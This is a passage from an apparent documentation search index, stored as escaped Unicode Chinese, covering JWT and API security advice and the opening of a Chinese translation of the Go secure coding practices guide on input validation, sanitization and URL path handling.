JWT\u672c\u8eab\u5305\u542b\u4e86\u8ba4\u8bc1\u4fe1\u606f\uff0c\u4e00\u65e6\u6cc4\u6f0f\uff0c\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u83b7\u5f97\u8be5\u4ee4\u724c\u7684\u6240\u6709\u6743\u9650\u3002\u5e94\u8be5\u5c06\u6709\u6548\u671f\u8bbe\u7f6e\u7684\u77ed\u4e00\u4e9b\uff1b \u4e3a\u4e86\u51cf\u5c11\u76d7\u7528JWT\uff0c\u5e94\u8be5\u5c3d\u53ef\u80fd\u4f7f\u7528HTTPS\u534f\u8bae\u4f20\u8f93\uff1b","title":"JWT"},{"location":"application-security/sdl/api-security-design/#oauth","text":"","title":"OAuth"},{"location":"application-security/sdl/api-security-design/#_8","text":"\u7f51\u5173\u5728API\u5b89\u5168\u4e2d\u7684\u4f5c\u7528 REST API \u5b89\u5168\u8bbe\u8ba1\u6307\u5357 HTTP API\u63a5\u53e3\u5b89\u5168\u8bbe\u8ba1 \u5f00\u53d1\u5b89\u5168\u7684 API \u6240\u9700\u8981\u6838\u5bf9\u7684\u6e05\u5355 \u79fb\u52a8APP\u7f51\u5173\u5b89\u5168\u8bbe\u8ba1 JSON Web Token \u5165\u95e8\u6559\u7a0b \u7406\u89e3OAuth2.0","title":"\u53c2\u8003\u8d44\u6599"},{"location":"application-security/sdl/go-scp/","text":"Go\u8bed\u8a00\u5b89\u5168\u7f16\u7801\u89c4\u8303-\u7ffb\u8bd1 \u82f1\u6587\u5730\u5740 \u7ffb\u8bd1\uff1ablood_zer0\u3001 Lingfighting \u5982\u679c\u7ffb\u8bd1\u7684\u6709\u95ee\u9898\uff1a\u8054\u7cfb\u6211(Lzero2012)\u3002\u5306\u5fd9\u7ffb\u8bd1\u80af\u5b9a\u4f1a\u6709\u5f88\u591a\u9519\u8bef\uff0c\u6b22\u8fce\u5927\u5bb6\u4e00\u8d77\u8ba8\u8bbaGo\u8bed\u8a00\u5b89\u5168\u80fd\u529b\u5efa\u8bbe\u3002 \u8f6c\u8f7d\u8bf7\u8d34\u4e0a\u539f\u94fe\u63a5 \u4ecb\u7ecd Go\u8bed\u8a00-Web\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u662f\u4e3a\u4e86\u7ed9\u4efb\u4f55\u4f7f\u7528Go\u8fdb\u884c\u7f16\u7a0b\u4e0eWeb\u5f00\u53d1\u7684\u4eba\u5458\u63d0\u4f9b\u6307\u5bfc\u3002 \u8fd9\u672c\u4e66\u662f Checkmarx\u5b89\u5168\u7814\u7a76\u56e2\u961f \u5171\u540c\u52aa\u529b\u7684\u7ed3\u6676\uff0c\u5b83\u9075\u5faa OWASP\u5b89\u5168\u7f16\u7801\u5b9e\u8df5\u5feb\u901f\u53c2\u8003\u6307\u5357 \u3002 \u8fd9\u672c\u4e66\u4e3b\u8981\u7684\u76ee\u7684\u662f\u4e3a\u4e86\u5e2e\u52a9\u5f00\u53d1\u4eba\u5458\u907f\u514d\u5e38\u89c1\u9519\u8bef\uff0c\u540c\u65f6\u901a\u8fc7\"\u5b9e\u8df5\u65b9\u6cd5\"\u5b66\u4e60\u7f16\u7a0b\u8bed\u8a00\u5fc3\u5f97\u3002\u672c\u4e66\u63d0\u4f9b\u4e86\u5173\u4e8e\"\u5982\u4f55\u5b89\u5168\u6267\u884c\"\u8be6\u7ec6\u4fe1\u606f\uff0c\u5c55\u793a\u4e86\u5728\u5f00\u53d1\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u5b89\u5168\u95ee\u9898\u3002 \u5173\u4e8eCheckmarx Checkmarx \u662f\u4e00\u5bb6\u5e94\u7528\u7a0b\u5e8f\u8f6f\u4ef6\u5b89\u5168\u516c\u53f8\uff0c\u516c\u53f8\u4f7f\u547d\u662f\u4e3a\u4f01\u4e1a\u7ec4\u7ec7\u63d0\u4f9b\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6d4b\u8bd5\u4ea7\u54c1\u4e0e\u670d\u52a1\uff0c\u63d0\u9ad8\u5f00\u53d1\u4eba\u5458\u4ea4\u4ed8\u5b89\u5168\u5e94\u7528\u7a0b\u5e8f\u3002\u62e5\u67091000\u5bb6\u5ba2\u670d\u5305\u62ec\u5168\u7403\u5341\u5927\u8f6f\u4ef6\u4f9b\u5e94\u5546\u4e2d\u7684\u7269\u4ef7\uff0c\u7f8e\u56fd\u9876\u7ea7\u94f6\u884c\u4e2d\u7684\u56db\u5bb6\uff0c\u4ee5\u53ca\u8bb8\u591a\u8d22\u5bcc500\u5f3a\u548c\u653f\u5e9c\u673a\u6784\uff0c\u5305\u62ecSAP\u3001\u4e09\u661f\u548cSalesforce.com \u5173\u4e8eCheckmarx\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u53ef\u4ee5\u8bbf\u95ee checkmarx.com \u6216\u8005\u5173\u6ce8\u6211\u4eec\u7684twitter\uff1a @checkmarx \u5173\u4e8eOWASP\u5b89\u5168\u7f16\u7a0b\u5b9e\u8df5 \" \u5b89\u5168\u7f16\u7a0b\u5b9e\u8df5\u5feb\u901f\u53c2\u8003\u6307\u5357 \"\u662f OWASP \u5f00\u6e90Web\u5b89\u5168\u9879\u76ee\u3002\u5b83\u662f\u4e00\u79cd\"\u6280\u672f\u65e0\u5173\u7684\u901a\u7528\u8f6f\u4ef6\u5b89\u5168\u7f16\u7a0b\u5b9e\u8df5\u96c6\uff0c\u91c7\u7528\u5168\u9762\u7684\u5217\u8868\u683c\u5f0f\uff0c\u53ef\u4ee5\u96c6\u6210\u5230\u5f00\u53d1\u751f\u547d\u5468\u671f\u4e2d\" OWASP\u672c\u8eab\u662f\"\u4e00\u4e2a\u5f00\u653e\u7684\u793e\u533a\uff0c\u81f4\u529b\u4e8e\u4f7f\u7ec4\u7ec7\u80fd\u591f\u6784\u601d\u3001\u5f00\u53d1\u3001\u83b7\u53d6\u3001\u64cd\u4f5c\u548c\u7ef4\u62a4\u53ef\u4fe1\u4efb\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u6240\u6709\u7684OWASP\u5de5\u5177\u3001\u6587\u6863\u3001\u8bba\u575b\u548c\u7ae0\u8282\u90fd\u662f\u514d\u8d39\u7684\uff0c\u5e76\u4e14\u5bf9\u4efb\u4f55\u6709\u5174\u8da3\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u7684\u4eba\u5f00\u653e\u3002\" \u8f93\u5165\u9a8c\u8bc1 \u5728Web\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u4e2d\uff0c\u5982\u679c\u672a\u5bf9\u7528\u6237\u8f93\u5165\u53ca\u76f8\u5173\u6570\u636e\u8fdb\u884c\u9a8c\u8bc1\u5219\u4f1a\u5b58\u5728\u5b89\u5168\u98ce\u9669\u3002\u6211\u4eec\u901a\u8fc7\"\u8f93\u5165\u9a8c\u8bc1\"\u4e0e\"\u8f93\u51fa\u5904\u7406\"\u6280\u672f\u6765\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u3002\u6839\u636e\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u5e94\u5728\u5e94\u7528\u7a0b\u5e8f\u7684\u6bcf\u4e2a\u5c42\u4e2d\u6267\u884c\u8fd9\u4e9b\u9a8c\u8bc1\u3002\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u6240\u6709\u6570\u636e\u9a8c\u8bc1\u7a0b\u5e8f\u5fc5\u987b\u5728\u53ef\u4fe1\u7cfb\u7edf\u4e0a\uff08\u5373\u5728\u670d\u52a1\u5668\u4e0a\uff09\u5b8c\u6210\u3002 \u5982\" OWASP SCP\u5feb\u901f\u53c2\u8003\u6307\u5357 \"\u4e2d\u6240\u8ff0\uff0c\u670916\u4e2a\u8981\u70b9\u6db5\u76d6\u4e86\u5f00\u53d1\u4eba\u5458\u5728\u5904\u7406\u8f93\u5165\u9a8c\u8bc1\u65f6\u5e94\u6ce8\u610f\u7684\u95ee\u9898\u3002\u5728\u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u65f6\u7f3a\u4e4f\u5bf9\u8fd9\u4e9b\u5b89\u5168\u98ce\u9669\u7684\u8003\u8651\u662f \u6ce8\u5165 \" OWASP Top 10 \"\u4e2d\u6392\u540d\u7b2c\u4e00\u7684\u4e3b\u8981\u539f\u56e0\u4e4b\u4e00\u3002 \u7528\u6237\u4ea4\u4e92\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u5f53\u524d\u5f00\u53d1\u8303\u4f8b\u7684\u4e3b\u8981\u5185\u5bb9\u3002\u968f\u7740Web\u5e94\u7528\u7a0b\u5e8f\u5185\u5bb9\u548c\u53ef\u80fd\u6027\u8d8a\u6765\u8d8a\u4e30\u5bcc\uff0c\u7528\u6237\u4ea4\u4e92\u548c\u63d0\u4ea4\u7684\u7528\u6237\u6570\u636e\u4e5f\u4f1a\u589e\u52a0\u3002\u6b63\u662f\u5728\u8fd9\u79cd\u80cc\u666f\u4e0b\uff0c\u8f93\u5165\u9a8c\u8bc1\u8d77\u7740\u91cd\u8981\u4f5c\u7528\u3002 \u5f53\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7528\u6237\u6570\u636e\u65f6\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u63d0\u4ea4\u7684\u6570\u636e\u5fc5\u987b\u88ab\u89c6\u4e3a\u4e0d\u5b89\u5168\uff0c\u5e76\u4e14\u53ea\u6709\u5728\u8fdb\u884c\u4e86\u9002\u5f53\u7684\u5b89\u5168\u68c0\u67e5\u540e\u624d\u80fd\u63a5\u53d7\u3002\u8fd8\u5fc5\u987b\u5c06\u6570\u636e\u6e90\u6807\u8bc6\u4e3a\u53d7\u4fe1\u4efb\u6216\u4e0d\u53d7\u4fe1\u4efb\uff0c\u5e76\u4e14\u5728\u4e0d\u53d7\u4fe1\u4efb\u7684\u6e90\u7684\u60c5\u51b5\u4e0b\uff0c\u5fc5\u987b\u8fdb\u884c\u9a8c\u8bc1\u68c0\u67e5\u3002 \u9a8c\u8bc1 \u5728\u9a8c\u8bc1\u68c0\u67e5\u4e2d\uff0c\u6839\u636e\u4e00\u7ec4\u6761\u4ef6\u68c0\u67e5\u7528\u6237\u8f93\u5165\uff0c\u4ee5\u4fdd\u8bc1\u7528\u6237\u786e\u5b9e\u8f93\u5165\u4e86\u9884\u671f\u6570\u636e\u3002 \u91cd\u8981\u4fe1\u606f \uff1a\u5982\u679c\u9a8c\u8bc1\u5931\u8d25\uff0c\u5219\u5fc5\u987b\u62d2\u7edd\u8f93\u5165\u3002 \u8fd9\u4e0d\u4ec5\u4ece\u5b89\u5168\u89d2\u5ea6\u800c\u4e14\u4ece\u6570\u636e\u4e00\u81f4\u6027\u548c\u5b8c\u6574\u6027\u7684\u89d2\u5ea6\u6765\u770b\u5f88\u91cd\u8981\uff0c\u56e0\u4e3a\u6570\u636e\u901a\u5e38\u7528\u4e8e\u5404\u79cd\u7cfb\u7edf\u548c\u5e94\u7528\u7a0b\u5e8f\u3002 \u672c\u6587\u5217\u51fa\u4e86\u5f00\u53d1\u4eba\u5458\u5728Go\u4e2d\u5f00\u53d1Web\u5e94\u7528\u7a0b\u5e8f\u65f6\u5e94\u6ce8\u610f\u7684\u5b89\u5168\u98ce\u9669\u3002 \u7528\u6237\u4ea4\u4e92 \u5141\u8bb8\u7528\u6237\u8f93\u5165\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4efb\u4f55\u90e8\u5206\u90fd\u5b58\u5728\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002 \u95ee\u9898\u4e0d\u4ec5\u53ef\u80fd\u6765\u81ea\u5bfb\u6c42\u5371\u5bb3\u5e94\u7528\u7a0b\u5e8f\u7684\u65b9\u6cd5\uff0c\u4e5f\u53ef\u80fd\u6765\u81ea\u4eba\u4e3a\u9519\u8bef\u5bfc\u81f4\u7684\u9519\u8bef\u8f93\u5165\uff08\u7edf\u8ba1\u4e0a\uff0c\u5927\u591a\u6570\u65e0\u6548\u6570\u636e\u60c5\u51b5\u901a\u5e38\u662f\u7531\u4eba\u4e3a\u9519\u8bef\u5f15\u8d77\u7684\uff09\u3002 \u5728Go\u4e2d\uff0c\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u9632\u6b62\u6b64\u7c7b\u95ee\u9898\u3002 Go\u5177\u6709\u672c\u673a\u5e93\uff0c\u5176\u4e2d\u5305\u62ec\u6709\u52a9\u4e8e\u786e\u4fdd\u4e0d\u4f1a\u53d1\u751f\u6b64\u7c7b\u9519\u8bef\u7684\u65b9\u6cd5\u3002 \u5728\u5904\u7406\u5b57\u7b26\u4e32\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u4ee5\u4e0b\u793a\u4f8b\u7684\u5305\uff1a strconv \u5305\u5904\u7406\u5230\u5176\u4ed6\u6570\u636e\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u8f6c\u6362\u3002 Atoi ParseBool ParseFloat ParseInt strings \u5305\u5305\u542b\u5904\u7406\u5b57\u7b26\u4e32\u53ca\u5176\u5c5e\u6027\u7684\u6240\u6709\u51fd\u6570\u3002 Trim ToLower ToTitle regexp \u5305\u652f\u6301\u6b63\u5219\u8868\u8fbe\u5f0f\u4ee5\u9002\u5e94\u81ea\u5b9a\u4e49\u683c\u5f0f\u3002 utf8 \u5305\u5b9e\u73b0\u51fd\u6570\u548c\u5e38\u91cf\u4ee5\u652f\u6301\u4ee5UTF-8\u7f16\u7801\u7684\u6587\u672c\u3002\u5b83\u5305\u62ec\u5728runes\u548cutf-8\u5b57\u8282\u5e8f\u5217\u4e4b\u95f4\u8f6c\u6362\u7684\u51fd\u6570\u3002 Valid\uff08\u9a8c\u8bc1UTF-8\u7f16\u7801\uff09 ValidRune\uff08\u9a8c\u8bc1UTF-8\u7f16\u7801\uff09 ValidString\uff08\u9a8c\u8bc1UTF-8\u7f16\u7801\uff09 EncodeRune\uff08UTF-8\u7f16\u7801\uff09 DecodeLastRune\uff08UTF-8\u89e3\u7801\uff09 DecodeLastRuneInString\uff08UTF-8\u89e3\u7801\uff09 \u6ce8\u610f \uff1aForm\u88abgo\u89c6\u4e3a\u5b57\u7b26\u4e32\u503c\u7684\u6620\u5c04\u3002 \u786e\u4fdd\u6570\u636e\u6709\u6548\u6027\u7684\u5176\u4ed6\u6280\u672f\u5305\u62ec\uff1a \u767d\u540d\u5355-\u5c3d\u53ef\u80fd\u6839\u636e\u5141\u8bb8\u7684\u5b57\u7b26\u767d\u540d\u5355\u9a8c\u8bc1\u8f93\u5165\u3002\u8bf7\u53c2\u89c1 Validation - Strip tags \u3002 \u8fb9\u754c\u68c0\u67e5-\u5e94\u9a8c\u8bc1\u6570\u636e\u548c\u6570\u5b57\u957f\u5ea6\u3002 \u5b57\u7b26\u8f6c\u4e49-\u7528\u4e8e\u7279\u6b8a\u5b57\u7b26\uff0c\u5982\u72ec\u7acb\u5f15\u53f7\u3002 \u6570\u5b57\u9a8c\u8bc1-\u5982\u679c\u8f93\u5165\u662f\u6570\u5b57\u3002 \u68c0\u67e5\u7a7a\u5b57\u8282-\uff08%00\uff09 \u68c0\u67e5\u65b0\u884c\u5b57\u7b26-%0d\uff0c%0a\uff0c\\r\\n \u68c0\u67e5\u8def\u5f84\u66f4\u6539\u5b57\u7b26-../\u6216\\.. \u68c0\u67e5\u6269\u5c55\u7684UTF-8-\u68c0\u67e5\u7279\u6b8a\u5b57\u7b26\u7684\u53ef\u9009\u8868\u793a\u5f62\u5f0f \u6ce8\u610f \uff1a\u786e\u4fddHTTP\u8bf7\u6c42\u548c\u54cd\u5e94\u5934\u53ea\u5305\u542bASCII\u5b57\u7b26\u3002 \u5b58\u5728\u5904\u7406go\u4e2d\u5b89\u5168\u6027\u7684\u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5305\uff1a Gorilla\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u5b89\u5168\u6027\u6700\u5e38\u7528\u7684\u5305\u4e4b\u4e00\u3002\u5b83\u652f\u6301websockets\u3001cookie\u4f1a\u8bdd\u3001rpc\u7b49\u3002 Form \u5c06url.values\u89e3\u7801\u4e3ago\u503c\uff0c\u5e76\u5c06go\u503c\u7f16\u7801\u4e3aurl.values\u3002Dual Array\u548cFull map\u652f\u6301\u3002 Validator \u8fdb\u884cGo \u7ed3\u6784\u4f53\u548c\u5b57\u6bb5\u9a8c\u8bc1\uff0c\u5305\u62ec\u8de8\u5b57\u6bb5\u3001\u8de8\u7ed3\u6784\u4f53\u3001\u6620\u5c04\u4ee5\u53ca\u5207\u7247\u548c\u6570\u7ec4\u3002 \u6587\u4ef6\u64cd\u4f5c \u5f53\u9700\u8981\u4f7f\u7528\u6587\u4ef6\u65f6\uff08read\u6216write\u6587\u4ef6\uff09\u4e5f\u5e94\u8be5\u8fdb\u884c\u9a8c\u8bc1\uff0c\u56e0\u4e3a\u5927\u591a\u6570\u6587\u4ef6\u64cd\u4f5c\u64cd\u4f5c\u90fd\u5904\u7406\u7528\u6237\u6570\u636e\u3002 \u5176\u4ed6\u6587\u4ef6\u68c0\u67e5\u8fc7\u7a0b\u5305\u62ec\"\u6587\u4ef6\u5b58\u5728\u6027\u68c0\u67e5\"\uff0c\u4ee5\u9a8c\u8bc1\u6587\u4ef6\u540d\u662f\u5426\u5b58\u5728\u3002 \u9644\u52a0\u6587\u4ef6\u4fe1\u606f\u5728 \u6587\u4ef6\u7ba1\u7406\u90e8\u5206 \uff0c\u6709\u5173\u9519\u8bef\u5904\u7406\u7684\u4fe1\u606f\u53ef\u4ee5\u5728\u6587\u6863\u7684 \u9519\u8bef\u5904\u7406 \u90e8\u5206\u627e\u5230\u3002 \u6570\u636e\u6e90 \u5f53\u6570\u636e\u4ece\u53d7\u4fe1\u4efb\u7684\u6e90\u4f20\u9012\u5230\u4e0d\u53d7\u4fe1\u4efb\u7684\u6e90\u65f6\uff0c\u5e94\u8fdb\u884c\u5b8c\u6574\u6027\u68c0\u67e5\u3002\u8fd9\u4fdd\u8bc1\u4e86\u6570\u636e\u6ca1\u6709\u88ab\u7be1\u6539\uff0c\u6211\u4eec\u6b63\u5728\u63a5\u6536\u9884\u671f\u7684\u6570\u636e\u3002\u5176\u4ed6\u6570\u636e\u6e90\u68c0\u67e5\u5305\u62ec\uff1a \u8de8\u7cfb\u7edf\u4e00\u81f4\u6027\u68c0\u67e5 Hash\u7edf\u8ba1 \u53c2\u7167\u5b8c\u6574\u6027 \u6ce8\u610f \uff1a\u5728\u73b0\u4ee3\u5173\u7cfb\u6570\u636e\u5e93\u4e2d\uff0c\u5982\u679c\u4e3b\u952e\u5b57\u6bb5\u4e2d\u7684\u503c\u4e0d\u53d7\u6570\u636e\u5e93\u5185\u90e8\u673a\u5236\u7684\u7ea6\u675f\uff0c\u90a3\u4e48\u5e94\u8be5\u5bf9\u5b83\u4eec\u8fdb\u884c\u9a8c\u8bc1\uff1a \u552f\u4e00\u6027\u68c0\u67e5 \u8868\u67e5\u8be2\u68c0\u67e5 POST\u9a8c\u8bc1\u64cd\u4f5c \u6839\u636e\u6570\u636e\u9a8c\u8bc1\u7684\u6700\u4f73\u5b9e\u8df5\uff0c\u8f93\u5165\u9a8c\u8bc1\u53ea\u662f\u6570\u636e\u9a8c\u8bc1\u6307\u5357\u7684\u7b2c\u4e00\u90e8\u5206\u3002\u56e0\u6b64\uff0c\u8fd8\u5e94\u6267\u884c\u9a8c\u8bc1\u540e\u64cd\u4f5c\u3002\u4f7f\u7528\u7684\u9a8c\u8bc1\u540e\u64cd\u4f5c\u56e0\u4e0a\u4e0b\u6587\u800c\u5f02\uff0c\u5206\u4e3a\u4e09\u7c7b\uff1a \u5f3a\u5236\u6267\u884c \uff1a\u4e3a\u4e86\u66f4\u597d\u5730\u4fdd\u8bc1\u6211\u4eec\u7684\u5e94\u7528\u548c\u6570\u636e\uff0c\u5b58\u5728\u7740\u51e0\u79cd\u6267\u884c\u7c7b\u578b\u3002 \u901a\u77e5\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\u4e0d\u7b26\u5408\u8981\u6c42\uff0c\u56e0\u6b64\u5e94\u4fee\u6539\u6570\u636e\u4ee5\u7b26\u5408\u8981\u6c42\u3002 \u5728\u670d\u52a1\u5668\u7aef\u4fee\u6539\u7528\u6237\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u800c\u4e0d\u901a\u77e5\u7528\u6237\u6240\u505a\u7684\u66f4\u6539\uff0c\u8fd9\u6700\u9002\u7528\u4e8e\u5177\u6709\u4ea4\u4e92\u4f7f\u7528\u7684\u7cfb\u7edf\u3002 \u6ce8\u610f \uff1a\u540e\u8005\u4e3b\u8981\u7528\u4e8e\u5916\u89c2\u66f4\u6539\uff08\u4fee\u6539\u7528\u6237\u654f\u611f\u6570\u636e\u53ef\u80fd\u5bfc\u81f4\u622a\u65ad\u7b49\u95ee\u9898\uff0c\u4ece\u800c\u5bfc\u81f4\u6570\u636e\u4e22\u5931\uff09\u3002 \u54a8\u8be2 \uff1a\u5efa\u8bae\u64cd\u4f5c\u901a\u5e38\u5141\u8bb8\u8f93\u5165\u4e0d\u53d8\u7684\u6570\u636e\uff0c\u4f46\u6d88\u606f\u6765\u6e90\u53c2\u4e0e\u8005\u88ab\u544a\u77e5\u6240\u8ff0\u6570\u636e\u5b58\u5728\u95ee\u9898\u3002\u8fd9\u6700\u9002\u7528\u4e8e\u975e\u4ea4\u4e92\u5f0f\u7cfb\u7edf\u3002 \u9a8c\u8bc1 \uff1a\u9a8c\u8bc1\u662f\u6307\u5efa\u8bae\u64cd\u4f5c\u4e2d\u7684\u7279\u6b8a\u60c5\u51b5\u3002\u5728\u8fd9\u4e9b\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u63d0\u4ea4\u6570\u636e\uff0c\u6e90\u53c2\u4e0e\u8005\u8981\u6c42\u7528\u6237\u9a8c\u8bc1\u6240\u8ff0\u6570\u636e\u5e76\u5efa\u8bae\u66f4\u6539\u3002\u7136\u540e\uff0c\u7528\u6237\u63a5\u53d7\u8fd9\u4e9b\u66f4\u6539\u6216\u4fdd\u7559\u5176\u539f\u59cb\u8f93\u5165\u3002 \u4e00\u4e2a\u7b80\u5355\u7684\u65b9\u6cd5\u6765\u8bf4\u660e\u8fd9\u662f\u4e00\u4e2a\u8d26\u5355\u5730\u5740\u8868\u5355\uff0c\u7528\u6237\u8f93\u5165\u4ed6\u7684\u5730\u5740\uff0c\u7cfb\u7edf\u5efa\u8bae\u4e0e\u5e10\u6237\u76f8\u5173\u7684\u5730\u5740\u3002\u7136\u540e\uff0c\u7528\u6237\u63a5\u53d7\u5176\u4e2d\u4e00\u4e2a\u5efa\u8bae\u6216\u53d1\u9001\u5230\u6700\u521d\u8f93\u5165\u7684\u5730\u5740\u3002 \u5904\u7406 \u5904\u7406\u662f\u6307\u5220\u9664\u6216\u66ff\u6362\u63d0\u4ea4\u7684\u6570\u636e\u7684\u8fc7\u7a0b\u3002\u5728\u5904\u7406\u6570\u636e\u65f6\uff0c\u5728\u8fdb\u884c\u4e86\u6b63\u786e\u7684\u9a8c\u8bc1\u68c0\u67e5\u4e4b\u540e\uff0c\u901a\u5e38\u4f1a\u91c7\u53d6\u4e00\u4e2a\u989d\u5916\u7684\u6b65\u9aa4\u6765\u52a0\u5f3a\u6570\u636e\u5b89\u5168\u6027\uff0c\u5373\u5904\u7406\u3002 \u6700\u5e38\u7528\u7684\u5904\u7406\u65b9\u6cd5\u5982\u4e0b\uff1a \u5c06\u5c0f\u4e8e\u5b57\u7b26\u7684\u5355\u4e2a\u5b57\u7b26\u8f6c\u5316\u4e3a\u5b9e\u4f53 \u5728\u672c\u673a\u5305HTML\u4e2d\uff0c\u6709\u4e24\u4e2a\u7528\u4e8e\u6e05\u7406\u7684\u51fd\u6570\uff1a\u4e00\u4e2a\u7528\u4e8e\u8f6c\u4e49HTML\u6587\u672c\uff0c\u53e6\u4e00\u4e2a\u7528\u4e8e\u53d6\u6d88\u8f6c\u4e49HTML\u3002\u51fd\u6570 escapeString() \u63a5\u53d7\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e76\u8fd4\u56de\u5e26\u6709\u7279\u6b8a\u8f6c\u4e49\u5b57\u7b26\u7684\u76f8\u540c\u5b57\u7b26\u4e32\u3002\u5373\uff0c \u53d8\u4e3a lt\uff1b\u3002\u8bf7\u6ce8\u610f\uff0c\u6b64\u51fd\u6570\u53ea\u8f6c\u4e49\u4ee5\u4e0b\u4e94\u4e2a\u5b57\u7b26\uff1a \u3001 \u3001 \u3001'\u548c'\u3002\u76f8\u53cd\uff0c\u8fd8\u6709 unescapeString() \u51fd\u6570\u53ef\u4ee5\u4ece\u5b9e\u4f53\u8f6c\u6362\u4e3a\u5b57\u7b26\u3002 \u5220\u9664\u6240\u6709\u6807\u7b7e \u867d\u7136 html/template \u5305\u6709 striptags() \u51fd\u6570\uff0c\u4f46\u5b83\u662f\u672a\u5bfc\u51fa\u7684\u3002\u7531\u4e8e\u6ca1\u6709\u5176\u4ed6\u672c\u673a\u5305\u5177\u6709\u53bb\u9664\u6240\u6709\u6807\u8bb0\u7684\u529f\u80fd\uff0c\u56e0\u6b64\u53ef\u4ee5\u9009\u62e9\u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff0c\u6216\u8005\u590d\u5236\u6574\u4e2a\u51fd\u6570\u4ee5\u53ca\u5b83\u7684\u79c1\u6709\u7c7b\u548c\u51fd\u6570\u3002 \u4e00\u4e9b\u7b2c\u4e09\u65b9\u5e93\u53ef\u4ee5\u5b9e\u73b0\u8fd9\u4e00\u70b9\uff1a https://github.com/kennygrant/sanitize https://github.com/maxwells/sanitize https://github.com/microcosm-cc/bluemonday \u5220\u9664\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u548c\u591a\u4f59\u7684\u7a7a\u683c text/template \u548c html/template \u5305\u62ec\u4e00\u79cd\u4ece\u6a21\u677f\u4e2d\u5220\u9664\u7a7a\u767d\u7684\u65b9\u6cd5\uff0c\u65b9\u6cd5\u662f\u5728\u64cd\u4f5c\u7684\u5206\u9694\u7b26\u5185\u4f7f\u7528\u51cf\u53f7\u3002 \u4f7f\u7528\u6e90\u4ee3\u7801\u6267\u884c\u6a21\u677f {{- 23}} {{45 -}} \u5c06\u5bfc\u81f4\u4ee5\u4e0b\u8f93\u51fa 23 45 \u6ce8\u610f \uff1a\u5982\u679c\u51cf\u53f7\u4e0d\u5728\u5f00\u59cb\u52a8\u4f5c\u5206\u9694\u7b26{{\u4e4b\u540e\u6216\u7ed3\u675f\u52a8\u4f5c\u5206\u9694\u7b26\u4e4b\u524d}}\uff0c\u51cf\u53f7-\u5c06\u5e94\u7528\u4e8e\u8be5\u503c\u3002 \u6a21\u677f\u6e90 {{ -3 }} \u8f93\u51fa -3 URL\u8bf7\u6c42\u8def\u5f84 \u5728 net/http \u5305\u4e2d\u6709\u4e00\u4e2a\u79f0\u4e3a ServeMux \u7684HTTP\u8bf7\u6c42\u591a\u8def\u590d\u7528\u5668\u7c7b\u578b\u3002\u5b83\u7528\u4e8e\u5c06\u4f20\u5165\u8bf7\u6c42\u4e0e\u6ce8\u518c\u6a21\u5f0f\u5339\u914d\uff0c\u5e76\u8c03\u7528\u4e0e\u8bf7\u6c42\u7684URL\u6700\u5339\u914d\u7684\u5904\u7406\u7a0b\u5e8f\u3002\u9664\u4e86\u4e3b\u8981\u76ee\u7684\u5916\uff0c\u5b83\u8fd8\u8d1f\u8d23\u6e05\u7406URL\u8bf7\u6c42\u8def\u5f84\uff0c\u91cd\u5b9a\u5411\u5305\u542b\u7684\u4efb\u4f55\u8bf7\u6c42\u3002.\u6216..\u5143\u7d20\u6216\u91cd\u590d\u659c\u6760\u5230\u4e00\u4e2a\u7b49\u6548\u7684\u3001\u66f4\u6e05\u6670\u7684URL\u3002 \u4e00\u4e2a\u7b80\u5355\u7684Mux\u793a\u4f8b\u8bf4\u660e\uff1a func main() { mux := http.NewServeMux() rh := http.RedirectHandler( http://yourDomain.org , 307) mux.Handle( /login , rh) log.Println( Listening... ) http.ListenAndServe( :3000 , mux) } \u6ce8\u610f \uff1a\u8bf7\u8bb0\u4f4f\uff0c ServeMux \u4e0d\u4f1a\u66f4\u6539 connect\u8bf7\u6c42\u7684URL\u8bf7\u6c42\u8def\u5f84\uff0c\u56e0\u6b64\uff0c\u5982\u679c\u4e0d\u9650\u5236\u5141\u8bb8\u7684\u8bf7\u6c42\u65b9\u6cd5\uff0c\u53ef\u80fd\u4f1a\u4f7f\u5e94\u7528\u7a0b\u5e8f\u5bb9\u6613\u53d7\u5230 \u8def\u5f84\u904d\u5386\u653b\u51fb \u3002 \u7b2c\u4e09\u65b9\u8f6f\u4ef6\u5305\uff1a Gorilla Toolkit - MUX \u8f93\u51fa\u7f16\u7801 \u867d\u7136\u5728 OWASP SCP\u5feb\u901f\u53c2\u8003\u6307\u5357 \u4e2d\u53ea\u67096\u4e2a\u9879\u76ee\u7b26\u53f7\u90e8\u5206\uff0c\u4f46\u662f\u5728Web\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4e2d\uff0c\u8f93\u51fa\u7f16\u7801\u7684\u9519\u8bef\u505a\u6cd5\u975e\u5e38\u666e\u904d\uff0c\u56e0\u6b64\u5bfc\u81f4\u4e86\u7b2c\u4e00\u5927\u6f0f\u6d1e\uff1a \u6ce8\u5165 \u3002 